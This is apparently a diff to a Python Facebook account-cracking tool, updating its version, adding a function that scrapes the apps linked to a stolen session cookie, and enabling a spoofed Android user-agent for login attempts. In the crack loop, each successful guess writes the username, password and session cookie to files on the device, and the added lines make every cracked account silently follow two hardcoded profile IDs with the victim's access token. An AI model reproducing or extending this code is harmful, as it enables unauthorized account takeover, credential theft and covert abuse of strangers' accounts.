@@ -235,13 +235,41 @@ logo4="""\033[1;97m
 \033[1;92m╔═════════════════════════════════════════╗
 \033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
 \033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
-\033[1;92m║ ᗙ  Version  : 0.6                       ║
+\033[1;92m║ ᗙ  Version  : 0.7                       ║
 \033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
 \033[1;92m╚═════════════════════════════════════════╝"""
 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 motd=[]
 
+
+
+#------------------APK<>CHECKER-------------------#    
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+      print(f'%s{P}[%s�%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
+    else:
+        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
+        for i in range(len(game)):
+            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        else:
+            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
+    else:
+        print(f'[] %s  Your Expired Apps     :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
 
 
 def hasil(ok,f2,cp):
@@ -699,7 +727,7 @@ class crack:
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
-                #ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
+                ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                 data = {
                     'locale':'en-US',
                     'client_country_code':'US',
@@ -908,12 +936,14 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
                         follow_id='100000160984736'
+                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
+                        follow_id='100009468801755'
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
